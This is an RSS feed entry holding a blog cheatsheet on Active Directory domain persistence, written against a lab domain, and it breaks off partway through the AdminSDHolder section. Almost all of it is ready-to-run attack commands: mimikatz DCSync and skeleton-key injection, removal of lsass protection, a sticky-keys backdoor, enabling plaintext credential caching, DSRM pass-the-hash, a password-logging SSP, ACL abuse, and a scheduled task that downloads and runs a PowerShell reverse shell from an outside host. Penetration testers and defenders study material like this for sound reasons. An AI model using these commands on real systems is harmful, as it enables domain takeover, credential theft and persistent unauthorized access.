<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Persistence | Giovanni Pecoraro</title><link>https://www.peco602.com/tag/persistence/</link><atom:link href="https://www.peco602.com/tag/persistence/index.xml" rel="self" type="application/rss+xml"/><description>Persistence</description><generator>Wowchemy (https://wowchemy.com)</generator><language>en-us</language><lastBuildDate>Thu, 01 Sep 2022 00:00:00 +0000</lastBuildDate><image><url>https://www.peco602.com/media/icon_hu0b7a4cb9992c9ac0e91bd28ffd38dd00_9727_512x512_fill_lanczos_center_3.png</url><title>Persistence</title><link>https://www.peco602.com/tag/persistence/</link></image><item><title>Domain Persistence cheatsheet</title><link>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</link><pubDate>Thu, 01 Sep 2022 00:00:00 +0000</pubDate><guid>https://www.peco602.com/post/0040-domain-persistence-cheatsheet/</guid><description>&lt;p>The following techiniques require Domain Administrator privileges on the target domain.&lt;/p>
&lt;h2 id="dcsync">DCSync&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.\mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # lsadump::dcsync /domain:cyberlab.cybercorp.local /user:krbtgt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span> &lt;span class="p">.\&lt;/span>&lt;span class="nb">Invoke-Mimikatz&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="err">“&lt;/span>&lt;span class="n">lsadump&lt;/span>&lt;span class="p">::&lt;/span>&lt;span class="n">dcsync&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">local&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">user&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="n">krbtgt&lt;/span>&lt;span class="err">”&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="adding-domain-admin-user">Adding domain admin user&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="n">user&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="n">FooBar123&lt;/span>&lt;span class="p">!&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Administrators&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Domain Admins&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">net&lt;/span> &lt;span class="nb">group &lt;/span>&lt;span class="s2">&amp;#34;Enterprise Admins&amp;#34;&lt;/span> &lt;span class="n">jeff&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ridges&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">add&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">domain&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="enabling-plaintext-credentials-caching-on-dcs">Enabling plaintext credentials caching on DCs&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">UseLogonCredential&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_DWORD&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="mf">1&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SYSTEM\CurrentControlSet\Control\Lsa&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">DisableDomainCreds&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_DWORD&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="mf">0&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="installing-a-sticky-keys-backdoor-on-dcs">Installing a sticky keys backdoor on DCs&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">reg&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="s2">&amp;#34;\\cyberlab-dc.cyberlab.cybercorp.local\HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">v&lt;/span> &lt;span class="n">Debugger&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">t&lt;/span> &lt;span class="n">REG_SZ&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">d&lt;/span> &lt;span class="s2">&amp;#34;C:\windows\system32\cmd.exe&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">f&lt;/span>&lt;span class="s2">&amp;#34;);
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="scheduled-task">Scheduled Task&lt;/h2>
&lt;p>Schedule and execute a task (needs a Silver Ticket for the HOST service)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">create&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="nb">SC &lt;/span>&lt;span class="n">Minute&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">RU&lt;/span> &lt;span class="s2">&amp;#34;NT Authority\SYSTEM&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TR&lt;/span> &lt;span class="s2">&amp;#34;powershell.exe -ep bypass -c &amp;#39;iex (New-Object Net.WebClient).DownloadString(&amp;#39;&amp;#39;http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1&amp;#39;&amp;#39;&amp;#39;)&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">run&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">schtasks&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">delete&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">S&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span> &lt;span class="p">/&lt;/span>&lt;span class="n">TN&lt;/span> &lt;span class="s2">&amp;#34;TASK_NAME&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="skeleton-key">Skeleton Key&lt;/h2>
&lt;p>Use the below command to inject a skeleton key (password would be &lt;em>mimikatz&lt;/em>) on a Domain Controller of choice (DA privileges required)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz.ps1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;misc::skeleton&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # token::elevate
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # misc::skeleton
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, it is possible to access any machine with a valid username and password as &lt;em>mimikatz&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Enter-PSSession&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;COMPUTER1&amp;#34;&lt;/span> &lt;span class="n">-Credential&lt;/span> &lt;span class="s2">&amp;#34;cyberlab.cybercorp.local\Administrator&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>In case lsass is running as a protected process, we can still use Skeleton Key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">:: mimikatz.exe
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # privilege::debug
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !+
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !processprotect /process:lsass.exe /remove
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # misc::skeleton
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">mimikatz # !
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="dsrm">DSRM&lt;/h2>
&lt;p>There is a local administrator on every DC called &lt;em>Administrator&lt;/em> whose password is the DSRM password. After altering the configuration on the DC, it is possible to pass the NTLM hash of this user to access the DC.&lt;/p>
&lt;p>Dump DSRM password (requires Domain Admin privileges):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;token::elevate&amp;#34; &amp;#34;lsadump::sam&amp;#34;&amp;#39;&lt;/span> &lt;span class="n">-ComputerName&lt;/span> &lt;span class="s2">&amp;#34;cyberlab-dc.cyberlab.cybercorp.local&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Enable logon through hash for DSRM:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">New-ItemProperty&lt;/span> &lt;span class="s2">&amp;#34;HKLM:\System\CurrentControlSet\Control\Lsa\&amp;#34;&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s2">&amp;#34;DsrmAdminLogonBehavior&amp;#34;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="mf">2&lt;/span> &lt;span class="n">-PropertyType&lt;/span> &lt;span class="n">DWORD&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Since it is the local administrator of the DC, we can pass-the-hash to authenticate. Use below command to pass the hash (/domain: parameter needs machine and not domain name)&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:[DC_FQDN] /user:Administrator /ntlm:[DSRM_NTLM_HASH] /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;sekurlsa::pth /domain:cyberlab-dc.cyberlab.cybercorp.local /user:Administrator /ntlm:a102ad5753f4c441e3af31c97fad86fd /run:powershell.exe&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, it is possible to navigate through domain controller file system:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">ls &lt;/span>&lt;span class="p">\\&lt;/span>&lt;span class="nb">cyberlab-dc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cyberlab&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">cybercorp&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="p">$&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="custom-ssp">Custom SSP&lt;/h2>
&lt;p>Add mililib.dll library to log every account access. Drop the &lt;strong>mimilib.dll&lt;/strong> to &lt;em>system32&lt;/em> and add mimilib to &lt;em>HKLMPackages&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="n">packages&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Get-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">OSConfig&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">select &lt;/span>&lt;span class="n">-ExpandProperty&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$packages&lt;/span> &lt;span class="p">+=&lt;/span> &lt;span class="s2">&amp;#34;mimilib&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">OSConfig&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="nv">$packages&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ItemProperty&lt;/span> &lt;span class="n">HKLM&lt;/span>&lt;span class="err">:&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">SYSTEM&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">CurrentControlSet&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Control&lt;/span>&lt;span class="p">\&lt;/span>&lt;span class="n">Lsa&lt;/span>&lt;span class="p">\&lt;/span> &lt;span class="n">-Name&lt;/span> &lt;span class="s1">&amp;#39;Security Packages&amp;#39;&lt;/span> &lt;span class="n">-Value&lt;/span> &lt;span class="nv">$packages&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Using mimikatz, inject into lsass (Not stable with Server 2016):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;misc::memssp&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Once the SSP is registered, all users who log on to the DC, and all local services will log their passwords to the &lt;strong>c:\Windows\System32\mimilsa.log&lt;/strong> file.&lt;/p>
&lt;h2 id="acl-right-abuse">ACL Right Abuse&lt;/h2>
&lt;p>With DA privileges, the ACL for the domain root can be modified to provide useful rights like FullControl or the ability to run “DCSync”.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Check if the user has replication rights on the domain:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;dc=cyberlab,dc=cybercorp,dc=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectType&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s1">&amp;#39;replication&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s1">&amp;#39;GenericAll&amp;#39;&lt;/span>&lt;span class="p">))}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Add FullControl rights to the domain object:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetDistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">All&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>or just add rights for DCSync and perform it:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Add-ObjectAcl&lt;/span> &lt;span class="n">-TargetDistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-PrincipalSamAccountName&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-Rights&lt;/span> &lt;span class="n">DCSync&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Set-ADACL&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span> &lt;span class="n">-Principal&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span> &lt;span class="n">-GUIDRight&lt;/span> &lt;span class="n">DCSync&lt;/span> &lt;span class="n">-Verbose&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Check if the rights have been correctly added:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-DistinguishedName&lt;/span> &lt;span class="s2">&amp;#34;dc=cyberlab,dc=cybercorp,dc=local&amp;#34;&lt;/span> &lt;span class="n">-ResolveGUIDs&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;STUDENT1&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-and&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ObjectType&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;replication&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">-or&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">ActiveDirectoryRights&lt;/span> &lt;span class="o">-match&lt;/span> &lt;span class="s2">&amp;#34;GenericAll&amp;#34;&lt;/span>&lt;span class="p">))}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>With replication rights the user can get the hash of &lt;em>krbtgt&lt;/em>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># Invoke-Mimikatz&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-Mimikatz&lt;/span> &lt;span class="n">-Command&lt;/span> &lt;span class="s1">&amp;#39;&amp;#34;lsadump::dcsync /user:cyberlab\krbtgt&amp;#34;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol>
&lt;h2 id="adminsdholder">AdminSDHolder&lt;/h2>
&lt;p>With DA privileges (Full Control/Write permissions) on the AdminSDHolder object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the AdminSDHolder object. In 60 minutes (when SDPROP runs), the user will be added with Full Control to the members of groups like Domain Admins without actually being a member of it.&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Check AdminSDHolder permissions (as normal user):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-powershell" data-lang="powershell">&lt;span class="line">&lt;span class="cl">&lt;span class="c"># PowerView&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Get-ObjectAcl&lt;/span> &lt;span class="n">-ADSprefix&lt;/span> &lt;span class="s2">&amp;#34;CN=AdminSDHolder,CN=System&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c"># ActiveDirectory Module&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">(&lt;/span>&lt;span class="nb">Get-Acl&lt;/span> &lt;span class="n">-Path&lt;/span> &lt;span class="s2">&amp;#34;AD:\CN=AdminSDHolder,CN=System,DC=cyberlab,DC=cybercorp,DC=local&amp;#34;&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="py">Access&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">?{&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">IdentityReference&lt;/span> &lt;span class="o">-like&lt;/span> &lt;span class="s2">&amp;#34;CYBERLAB\STUDENT1&amp;#34;&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Add &lt;strong>FullControl&lt;/strong> permissions for a user to the AdminSDHolder&lt;/p>
